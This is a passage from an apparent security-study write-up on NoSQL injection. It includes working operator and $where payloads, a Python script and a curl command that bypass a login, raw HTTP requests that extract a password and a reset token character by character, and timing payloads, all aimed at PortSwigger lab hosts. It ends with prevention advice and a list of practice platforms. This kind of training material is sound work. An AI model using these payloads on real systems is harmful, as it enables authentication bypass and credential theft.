+<p><strong>Error-Based:</strong> Sometimes, a bad query will make the database throw an error that gets displayed on the page. This is a huge clue! An error message like <code>unrecognized operator: $foo</code> tells you that the application is trying to pass your input to the database. You know you're on the right track.</p>
+</li>
+<li>
+<p><strong>Time-Based (Blind):</strong> This is the most advanced technique. What if the application doesn't change its content or show errors? You can inject a command that tells the database to "sleep" or perform a heavy computation <em>if</em> a certain condition is true. If you inject a payload that says, "If the admin's password starts with 'a', sleep for 5 seconds," and the page takes 5 seconds longer to load, you've just learned the first letter of the password. This is called <strong>blind injection</strong>.</p>
+</li>
+</ol>
+<h3 id="basic-operator-injection-techniques">Basic Operator Injection Techniques<a class="headerlink" href="#basic-operator-injection-techniques" title="Permanent link">&para;</a></h3>
+<h4 id="get-parameter-injection">GET Parameter Injection<a class="headerlink" href="#get-parameter-injection" title="Permanent link">&para;</a></h4>
+<p>Something like this might work in a URL:</p>
+<div class="highlight"><pre><span></span><code>username[$ne]=invalid
+</code></pre></div>
+<h4 id="post-json-injection">POST JSON Injection<a class="headerlink" href="#post-json-injection" title="Permanent link">&para;</a></h4>
+<p>We can also change GET to POST, and then inject into the body with <code>Content-Type: application/json</code></p>
+<p>In the JSON body, test whether the username (example) input is processing the query operator:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:{</span><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="s2">&quot;invalid&quot;</span><span class="p">},</span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;peter&quot;</span><span class="p">}</span>
+</code></pre></div>
+<p>If the <code>$ne</code> operator is applied, then it will query all accounts that do NOT have the username "invalid"</p>
+<h4 id="authentication-bypass">Authentication Bypass<a class="headerlink" href="#authentication-bypass" title="Permanent link">&para;</a></h4>
+<p>This could be used to bypass authentication if both the username and password fields process the operator. </p>
+<p>We can check a list of known usernames:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:{</span><span class="nt">&quot;$in&quot;</span><span class="p">:[</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="s2">&quot;administrator&quot;</span><span class="p">,</span><span class="s2">&quot;superadmin&quot;</span><span class="p">]},</span><span class="nt">&quot;password&quot;</span><span class="p">:{</span><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">}}</span>
+</code></pre></div>
+<details class="example">
+<summary>PortSwigger NoSQL Injection Lab 2: Exploiting NoSQL operator injection to bypass authentication</summary>
+<h3 id="lab-2-exploiting-nosql-operator-injection-to-bypass-authentication">Lab 2: Exploiting NoSQL operator injection to bypass authentication<a class="headerlink" href="#lab-2-exploiting-nosql-operator-injection-to-bypass-authentication" title="Permanent link">&para;</a></h3>
+<p>Original request</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727084852.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727084852.png" /></a></p>
+<p>Checking if the username field processes the operator...looks like it does because even though we didn't enter the correct username, we still are able to get logged in as <code>wiener</code></p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727084914.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727084914.png" /></a></p>
+<p>Checking if the password field also processes it...looks like it also does. Note the response that the query returned an unexpected number of results. </p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727084926.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727084926.png" /></a></p>
+<p>Using the regex operator we can get logged in as the admin user, which has a random username</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727084944.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727084944.png" /></a></p>
+<h3 id="sample-code-solution">Sample Code Solution<a class="headerlink" href="#sample-code-solution" title="Permanent link">&para;</a></h3>
+<h4 id="python">Python<a class="headerlink" href="#python" title="Permanent link">&para;</a></h4>
+<p>This code will solve this challenge</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://0a6f00c903ee32228074712400a300a8.web-security-academy.net/login&#39;</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv&#39;</span><span class="p">,</span>
+  <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
+  <span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="s1">&#39;session=Oeo2rw4ypJQwM1hYHAsO4yNGTqXwxzJq&#39;</span><span class="p">,</span>
+  <span class="s1">&#39;Priority&#39;</span><span class="p">:</span> <span class="s1">&#39;u=0&#39;</span>
+<span class="p">}</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="p">{</span>
+    <span class="s2">&quot;$regex&quot;</span><span class="p">:</span> <span class="s2">&quot;admin*&quot;</span>
+  <span class="p">},</span>
+  <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="p">{</span>
+    <span class="s2">&quot;$ne&quot;</span><span class="p">:</span> <span class="s2">&quot;invalid&quot;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="curl">Curl<a class="headerlink" href="#curl" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-H<span class="w"> </span><span class="s1">&#39;User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type:application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-H<span class="w"> </span><span class="s1">&#39;Cookie:session=Oeo2rw4ypJQwM1hYHAsO4yNGTqXwxzJq&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-H<span class="w"> </span><span class="s1">&#39;Priority:u=0&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
+<span class="s1">  &quot;username&quot;: {</span>
+<span class="s1">    &quot;$regex&quot;: &quot;admin*&quot;</span>
+<span class="s1">  },</span>
+<span class="s1">  &quot;password&quot;: {</span>
+<span class="s1">    &quot;$ne&quot;: &quot;invalid&quot;</span>
+<span class="s1">  }</span>
+<span class="s1">}&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="s1">&#39;https://0a6f00c903ee32228074712400a300a8.web-security-academy.net/login&#39;</span>
+</code></pre></div>
+</details>
+<h2 id="data-extraction-techniques">Data Extraction Techniques<a class="headerlink" href="#data-extraction-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="identifying-field-names">Identifying Field Names<a class="headerlink" href="#identifying-field-names" title="Permanent link">&para;</a></h3>
+<p>It can be difficult to identify field names since NoSQL doesn't require a fixed schema (like SQL), but we can usually infer the existence of a field by the responses:</p>
+<div class="highlight"><pre><span></span><code>https://insecure-website.com/user/lookup?username=admin&#39;+%26%26+this.password!%3d&#39;
+</code></pre></div>
+<p>Comparing against a known field:</p>
+<div class="highlight"><pre><span></span><code>admin&#39; &amp;&amp; this.username!=&#39;
+</code></pre></div>
+<p>and an unknown field:</p>
+<div class="highlight"><pre><span></span><code>admin&#39; &amp;&amp; this.foo!=&#39;
+</code></pre></div>
+<h3 id="extracting-data-with-syntax-injection">Extracting Data with Syntax Injection<a class="headerlink" href="#extracting-data-with-syntax-injection" title="Permanent link">&para;</a></h3>
+<p>If the query is using a <code>$where</code> clause, we can try to inject into that to retrieve sensitive data:</p>
+<h4 id="character-by-character-extraction">Character-by-Character Extraction<a class="headerlink" href="#character-by-character-extraction" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>admin&#39; &amp;&amp; this.password[0] == &#39;a&#39; || &#39;a&#39;==&#39;b
+</code></pre></div>
+<h4 id="using-javascript-functions">Using JavaScript Functions<a class="headerlink" href="#using-javascript-functions" title="Permanent link">&para;</a></h4>
+<p>Using the JavaScript <code>match()</code> function:</p>
+<div class="highlight"><pre><span></span><code>admin&#39; &amp;&amp; this.password.match(/\d/) || &#39;a&#39;==&#39;b
+</code></pre></div>
+<details class="example">
+<summary>PortSwigger NoSQL Injection Lab 3: Exploiting NoSQL injection to extract data</summary>
+<h3 id="lab-3-exploiting-nosql-injection-to-extract-data">Lab 3: Exploiting NoSQL injection to extract data<a class="headerlink" href="#lab-3-exploiting-nosql-injection-to-extract-data" title="Permanent link">&para;</a></h3>
+<p><a href="https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-syntax-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-data">PortSwigger NoSQL Injection Lab #3</a></p>
+<p>We need to extract the administrator password and log in to solve the lab</p>
+<p>Confirming that the <code>password</code> field exists</p>
+<div class="highlight"><pre><span></span><code>GET /user/lookup?user=administrator&#39;+%26%26+this.password!%3d&#39; HTTP/1.1
+Host: 0aa7008b033ca58c807c083c00f8009e.web-security-academy.net
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Referer: https://0aa7008b033ca58c807c083c00f8009e.web-security-academy.net/my-account?id=wiener
+Connection: keep-alive
+Cookie: session=QMIuURiqO62GwvlLWRvDsROkHS4k2u5q
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+X-PwnFox-Color: magenta
+Priority: u=4
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 96
+
+{
+    &quot;username&quot;: &quot;administrator&quot;,
+    &quot;email&quot;: &quot;admin@normal-user.net&quot;,
+    &quot;role&quot;: &quot;administrator&quot;
+}
+</code></pre></div>
+<p>First thing, we need to figure out how long the password is. The following request will return the right response if the condition is true, and will return a user not found error if it's false.</p>
+<div class="highlight"><pre><span></span><code>GET /user/lookup?user=administrator&#39;%20%26%26%20this.password.length%20%3E%201%20%7C%7C%20&#39;a&#39;%3D%3D&#39;b HTTP/1.1
+Host: 0aa7008b033ca58c807c083c00f8009e.web-security-academy.net
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Referer: https://0aa7008b033ca58c807c083c00f8009e.web-security-academy.net/my-account?id=wiener
+Connection: keep-alive
+Cookie: session=QMIuURiqO62GwvlLWRvDsROkHS4k2u5q
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+X-PwnFox-Color: magenta
+Priority: u=4
+</code></pre></div>
+<p>Running this through automate (intruder, whatever) we see that we get the correct response with <code>this.password.length &gt; 7</code>, but it fails with <code>&gt; 8</code>, so we know the password has 8 characters. </p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727102840.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727102840.png" /></a></p>
+<p>Now we can tweak the automate settings a bit</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727105215.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727105215.png" /></a></p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727105229.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727105229.png" /></a></p>
+<p>Looking at the results we can see it <strong>seems</strong> to have worked...</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727105339.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727105339.png" /></a></p>
+<div class="highlight"><pre><span></span><code>ppycphbs
+</code></pre></div>
+<p>That worked to log in as the administrator, and we solved the lab</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727105503.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727105503.png" /></a></p>
+</details>
+<h3 id="advanced-operator-injection">Advanced Operator Injection<a class="headerlink" href="#advanced-operator-injection" title="Permanent link">&para;</a></h3>
+<h4 id="using-where-to-confirm-injection">Using <code>$where</code> to Confirm Injection<a class="headerlink" href="#using-where-to-confirm-injection" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;wiener&quot;</span><span class="p">,</span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;peter&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;$where&quot;</span><span class="p">:</span><span class="s2">&quot;0&quot;</span><span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;wiener&quot;</span><span class="p">,</span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;peter&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;$where&quot;</span><span class="p">:</span><span class="s2">&quot;1&quot;</span><span class="p">}</span>
+</code></pre></div>
+<p>If there's a difference, it could mean the JavaScript in the <code>$where</code> clause is being evaluated.</p>
+<h4 id="extracting-field-names-with-keys">Extracting Field Names with <code>keys()</code><a class="headerlink" href="#extracting-field-names-with-keys" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;$where&quot;</span><span class="p">:</span><span class="s2">&quot;Object.keys(this)[0].match(&#39;^.{0}a.*&#39;)&quot;</span><span class="p">}</span>
+</code></pre></div>
+<h4 id="data-exfiltration-with-operators">Data Exfiltration with Operators<a class="headerlink" href="#data-exfiltration-with-operators" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="nt">&quot;password&quot;</span><span class="p">:{</span><span class="nt">&quot;$regex&quot;</span><span class="p">:</span><span class="s2">&quot;^.*&quot;</span><span class="p">}}</span>
+</code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Confirming injection with $regex</p>
+<p>If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the <code>$regex</code> operator to extract data character by character. For example, the following payload checks whether the password begins with an <code>a</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="nt">&quot;password&quot;</span><span class="p">:{</span><span class="nt">&quot;$regex&quot;</span><span class="p">:</span><span class="s2">&quot;^a*&quot;</span><span class="p">}}</span>
+</code></pre></div>
+</div>
+<details class="example">
+<summary>PortSwigger NoSQL Injection Lab 4: Exploiting NoSQL operator injection to extract unknown fields</summary>
+<p>We can send the original login request...note the "Invalid username or password" message.</p>
+<div class="highlight"><pre><span></span><code>POST /login HTTP/1.1
+Host: 0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Referer: https://0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net/login
+Content-Type: application/json
+Content-Length: 42
+Origin: https://0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net
+Connection: keep-alive
+Cookie: session=i4eqOjus4JQrGjGabfK4wcmKZO9nu1T6
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+X-PwnFox-Color: magenta
+Priority: u=0
+
+{&quot;username&quot;:&quot;carlos&quot;,&quot;password&quot;:&quot;invalid&quot;}
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 3392
+
+[...SNIP...]
+
+                &lt;section&gt;
+                    &lt;p class=is-warning&gt;Invalid username or password&lt;/p&gt;
+                    &lt;form class=login-form method=POST action=&quot;/login&quot;&gt;
+                        &lt;label&gt;Username&lt;/label&gt;
+                        &lt;input required type=username name=&quot;username&quot; autofocus&gt;
+                        &lt;label&gt;Password&lt;/label&gt;
+                        &lt;input required type=password name=&quot;password&quot;&gt;
+                        &lt;a href=/forgot-password&gt;Forgot password?&lt;/a&gt;
+                        &lt;br /&gt;
+                        &lt;button class=button onclick=&quot;event.preventDefault(); jsonSubmit(&#39;/login&#39;)&quot;&gt; Log in &lt;/button&gt;
+                        &lt;script src=&#39;/resources/js/login.js&#39;&gt;&lt;/script&gt;
+                    &lt;/form&gt;
+                &lt;/section&gt;
+</code></pre></div>
+<p>Now we can use a <code>$where</code> clause to compare results. First with a false value:</p>
+<div class="highlight"><pre><span></span><code>{&quot;username&quot;:&quot;carlos&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;invalid&quot;}, &quot;$where&quot;:&quot;0&quot;}
+</code></pre></div>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727130513.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727130513.png" /></a></p>
+<p>And then with a true value:</p>
+<div class="highlight"><pre><span></span><code>{&quot;username&quot;:&quot;carlos&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;invalid&quot;}, &quot;$where&quot;:&quot;1&quot;}
+</code></pre></div>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727130656.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727130656.png" /></a></p>
+<p>Note the change in the response. There's now an "Account locked: please reset your password" message instead of the invalid credentials error. </p>
+<p>Now we can use <code>keys()</code> to identify all the fields on the user object.</p>
+<div class="highlight"><pre><span></span><code>{&quot;username&quot;:&quot;carlos&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;invalid&quot;}, &quot;$where&quot;:&quot;Object.keys(this)[1].match(&#39;^.{}.*&#39;)&quot;}
+</code></pre></div>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727135006.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727135006.png" /></a></p>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727135026.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727135026.png" /></a></p>
+<p>Running this shows the first field is "username".</p>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727135117.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727135117.png" /></a></p>
+<p>Now switching the key index from "1" to "2", we see that the next key is "password"</p>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727135301.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727135301.png" /></a></p>
+<p>Number three is "email"</p>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727135933.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727135933.png" /></a></p>
+<p>Four returns errors. I eventually figured out that this only works if you generate a password reset for carlos first. After generating a password reset request for carlos and re-running this, we see that there's now a field <code>newPwdTkn</code></p>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727143052.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727143052.png" /></a></p>
+<p>Now, when we submit this to the <code>/forgot-password</code> endpoint in the GET request, we get the "Invalid token error". </p>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727143217.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727143217.png" /></a></p>
+<p>Now that we have the name of the field, it's possible to brute force that value the same way as the others.</p>
+<div class="highlight"><pre><span></span><code>{&quot;username&quot;:&quot;carlos&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;invalid&quot;}, &quot;$where&quot;:&quot;this.newPwdTkn.match(&#39;^.{§§}§§.*&#39;)&quot;}
+</code></pre></div>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727144423.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727144423.png" /></a></p>
+<p>When we do that we get: <code>f985d7e05a11df73</code>. When we send that request, we're able to reset carlos' password</p>
+<div class="highlight"><pre><span></span><code>GET /forgot-password?newPwdTkn=f985d7e05a11df73 HTTP/1.1
+Host: 0a20007604e914df807e7b9d004c00da.web-security-academy.net
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Connection: keep-alive
+Referer: https://0a20007604e914df807e7b9d004c00da.web-security-academy.net/login
+Cookie: session=fuemSpbHDnaLWqhjYdNdEbh4RLhwtxGa
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+X-PwnFox-Color: magenta
+Priority: u=0, i
+</code></pre></div>
+<p>After resetting the password we can log in as carlos and solve the lab</p>
+<p><a class="glightbox" href="../../../assets/screenshots/nosql/Pasted%20image%2020250727144654.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../assets/screenshots/nosql/Pasted%20image%2020250727144654.png" /></a></p>
+</details>
+<h2 id="timing-based-attacks-blind-injection">Timing-Based Attacks (Blind Injection)<a class="headerlink" href="#timing-based-attacks-blind-injection" title="Permanent link">&para;</a></h2>
+<p>Timing-based attacks are useful when the application doesn't return different content or show error messages. You can trigger a time delay under certain conditions to extract data.</p>
+<h3 id="basic-timing-payloads">Basic Timing Payloads<a class="headerlink" href="#basic-timing-payloads" title="Permanent link">&para;</a></h3>
+<h4 id="using-while-loop-for-delays">Using <code>while</code> Loop for Delays<a class="headerlink" href="#using-while-loop-for-delays" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="nx">admin</span><span class="s1">&#39;+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]===&quot;a&quot;) &amp;&amp; waitTill &gt; new Date()){};}(this)+&#39;</span>
+</code></pre></div>
+<h4 id="using-sleep-function">Using <code>sleep</code> Function<a class="headerlink" href="#using-sleep-function" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="nx">admin</span><span class="s1">&#39;+function(x){if(x.password[0]===&quot;a&quot;){sleep(5000)};}(this)+&#39;</span>
+</code></pre></div>
+<p>These payloads will cause a 5-second delay if the first character of the password is "a", allowing you to extract data character by character.</p>
+<h2 id="prevention">Prevention<a class="headerlink" href="#prevention" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p><strong>Strict Input Validation (Whitelisting):</strong> This is the single most important defense. The application should never trust user input. Instead of trying to remove bad characters (<strong>blacklisting</strong>), it's far safer to only allow known good characters (<strong>whitelisting</strong>). More importantly, the code should perform <strong>type-checking</strong>. If the application expects a username (a string), it should reject any input that is an object (like <code>{"$ne": null}</code>). If it expects an age (a number), it should reject strings.</p>
+</li>
+<li>
+<p><strong>Use an Object-Document Mapper (ODM):</strong> ODMs are libraries (like Mongoose for Node.js/MongoDB) that act as a middle layer between the application and the database. They allow developers to work with data as programming objects rather than raw database queries. A well-built ODM often handles sanitization and parameterization automatically, making it much harder to introduce an injection flaw.</p>
+</li>
+<li>
+<p><strong>Principle of Least Privilege:</strong> The user account that the web application uses to connect to the database should have the minimum permissions necessary. For example, if a part of your application only needs to <strong>read</strong> user profiles, its database account shouldn't have permission to <strong>delete</strong> them. This won't prevent an injection, but it dramatically limits the damage an attacker can do if they find one.</p>
+</li>
+</ul>
+<hr />
+<h2 id="practice-resources">Practice Resources<a class="headerlink" href="#practice-resources" title="Permanent link">&para;</a></h2>
+<p>Here are 4 excellent and free resources where you can safely and legally practice NoSQL injection. Most of these are easily run locally using Docker.</p>
+<h3 id="1-owasp-juice-shop">1. OWASP Juice Shop<a class="headerlink" href="#1-owasp-juice-shop" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>What it is:</strong> This is probably the most popular modern web application for security training. It's an intentionally insecure web shop full of vulnerabilities, including several NoSQL injection challenges. The challenges range from basic login bypasses to more advanced data exfiltration.</li>
+<li><strong>Why it's great:</strong> It puts the vulnerabilities in the context of a real-world application. You have to find the vulnerable input fields first before you can exploit them.</li>
+<li><strong>How to get it:</strong> It has an official Docker image that is incredibly easy to run. Just search for <code>owasp/juice-shop</code> on Docker Hub or follow the simple instructions on their official site.</li>
+</ul>
+<h3 id="2-portswigger-web-security-academy">2. PortSwigger Web Security Academy<a class="headerlink" href="#2-portswigger-web-security-academy" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>What it is:</strong> This is a free, online learning platform created by the makers of Burp Suite. It provides dozens of high-quality, interactive labs that target specific vulnerabilities.</li>
+<li><strong>Why it's great:</strong> Their NoSQL injection labs are fantastic. They walk you through detecting the vulnerability, bypassing logins, and even exploiting syntax variations. It's all browser-based, so there's no local setup required.</li>
+<li><strong>How to get it:</strong> Simply register for a free account on the <a href="https://portswigger.net/web-security">PortSwigger website</a> to get access to all the labs.</li>
+</ul>
+<h3 id="3-nosqlgoat">3. NoSQLGoat<a class="headerlink" href="#3-nosqlgoat" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>What it is:</strong> This is a project from OWASP specifically designed to be a vulnerable-by-design application for learning NoSQL injection. It's less of a broad "find the vulnerability" game and more of a focused shooting range for NoSQLi.</li>
+<li><strong>Why it's great:</strong> It's hyper-focused on our topic. It covers a wide variety of injection types and scenarios related to MongoDB.</li>
+<li><strong>How to get it:</strong> It's available on GitHub and can be easily deployed using the provided Docker instructions.</li>
+</ul>
+<h3 id="4-hack-the-box-tryhackme">4. Hack The Box &amp; TryHackMe<a class="headerlink" href="#4-hack-the-box-tryhackme" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>What they are:</strong> These are online platforms where you can hack into retired, realistic machines in a CTF (Capture The Flag) style. They aren't just single web apps, but often entire virtual machines with multiple services.</li>
+<li><strong>Why they're great:</strong> They provide the most realistic practice. You'll find NoSQL injection vulnerabilities as part of a larger chain of exploitation needed to compromise a system. Many retired machines and dedicated learning "rooms" on these platforms feature NoSQLi.</li>
+<li><strong>How to get it:</strong> Both platforms operate on a "freemium" model. You can access many retired machines and learning paths for free, with an optional subscription for more content.</li>
+</ul>
+  
+  <!-- Source file information -->
+  
+  
+  <!-- Was this page helpful? -->
+  
+  
+
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
